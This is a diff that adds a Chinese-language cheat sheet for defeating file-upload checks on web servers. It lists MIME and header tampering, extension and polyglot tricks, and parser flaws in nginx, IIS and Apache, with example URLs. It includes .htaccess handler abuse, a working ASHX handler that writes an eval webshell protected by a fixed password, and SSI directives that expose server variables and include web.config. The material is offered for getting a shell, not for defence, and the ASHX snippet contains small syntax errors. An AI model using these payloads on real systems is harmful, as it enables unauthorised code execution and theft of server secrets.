@@ -1,0 +1,87 @@
+绕过验证机制：
+
+1.抓包改包（MIME修改绕过）
+2.文件后缀名大小写绕过	asp	：	cer，asa，ashx，cdx	php	：	php3，php4，php5，PhP
+3.文件内容绕过		copy \b 1.jpg+1.php 2.jpg	绕过内容检查，上传时将2.jpg改为2.php
+4.Javascript绕过
+5.对Content-Disposition，Content-name，filename，form-data（修改为~form-data）
+	大小写替换，增减空格，
+	将 form-data 修改为f+orm-data
+	将 from-data 修改为   form-d+ata
+	通过替换form-data 为*来绕过Content-Disposition: *; name="file"; filename="yjh.php"
+7.双文件上传（第一个正常jpg/txt，第二个asp/php/jsp）
+5.解析漏洞
+
+nginx 0.7.65以下（0.5.*, 0.6.*, 0.7.* ）
+全版本系列和0.8.37（0.8.*）以下8系列受影响	
+http://ap.test.com:8080/1.jpg/1.php
+ http://ap.test.com:8080/1.jpg%00.php
+
+ IIS解析漏洞	
+
+ 版本：iis5.*/6.0
+ http://ap.test.com/1.asp/1.jpg 
+ 在html代码中找到上传的路径名，修改为.asp | .cer | .cdx等后缀
+
+Apache解析漏洞：
+
+Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断。
+比如 mst.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把mst.php.owf.rar解析成php。
+如何判断是不是合法的后缀就是这个漏洞的利用关键
+测试时可以尝试上传一个mst.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀
+
+其他解析漏洞：
+
+在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，
+在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。
+
+如果在Apache中.htaccess可被执行，且可被上传，那可以尝试在.htaccess中写入:
+<FilesMatch "mst.jpg"> SetHandler application/x-httpd-php 
+</FilesMatch>
+然后再上传mst.jpg的木马, 这样mst.jpg就可解析为php文件
+
+文件名解析
+	在IIS6.0下，分号后面的不被解析，也就是说mst.asp;.jpg会被服务器看成是mst.asp，还有IIS6.0 默认的可执行文件除了asp还包含这三种:/.asa/.cer/.cdx
+
+版本：iis7.0/7.5
+	畸形解析漏洞，上传一个名字为mst.jpg，内容为：一句话代码的文件，然后访问mst.jpg/1.php,就可以连接 。同Nginx解析1
+
+第一个是ashx脚本，服务器有.net环境但aspx被禁止上传时适用。这个执行后会在当前目录下生成webshell.asp一句话木马，密码是pass 也可以写入其它文件，你懂的。
+
+    <%@ WebHandler Language="C#" class="Handler"% >
+    using System;
+    using System.Web;
+    using System.IO;
+    public class Handler:IHttpHandler {
+     
+    public void ProcessRequest (HttpContext context) {
+        context.Response.ContentType = "text/plain";
+        StreamWriter file = File.CreateText(context.Server.MapPath("webshell.asp")));
+        file.Write("<%eval request(\"pass\")%>");
+        file.Flush();
+        file.Close();
+        context.Response.Write("www.webshell.cc");
+    }
+     
+    public bool IsReusable {
+        get {
+            return false;
+        }
+    }
+    }
+
+第二个是stm/shtm/shtml脚本，虽然不能直接拿到webshell，但是可以获取到一些服务器信息。注意stm中的include可以将web.config文件中的内容包含进来，然后你懂的。
+
+    <!--#ECHO var="ALL_HTTP"-->
+    当前文件名称:<!--#ECHO var="DOCUMENT_NAME"-->
+    Web服务器的名称和版本:<!--#ECHO var="SERVER_SOFTWARE"-->
+    主机名:<!--#ECHO var="SERVER_NAME"-->
+    端口:<!--#ECHO var="SERVER_PORT"-->
+    客户或客户代理IP地址:<!--#ECHO var="REMOTE_ADDR"-->
+    客户或客户代理主机名:<!--#ECHO var="REMOTE_HOST"-->
+    PATH_INFO 的值，但带有扩展为某个目录规范的虚拟路径:
+    <!--#ECHO var="PATH_TRANSLATED"-->
+    客户端给出附加路径信息:<!--#ECHO var="PATH_INFO"-->
+    <!--#ECHO var="HTTP_ACCEPT"-->
+    <!--#ECHO var="DOCUMENT_URI"-->
+    <!--#include file="../../web.config"-->
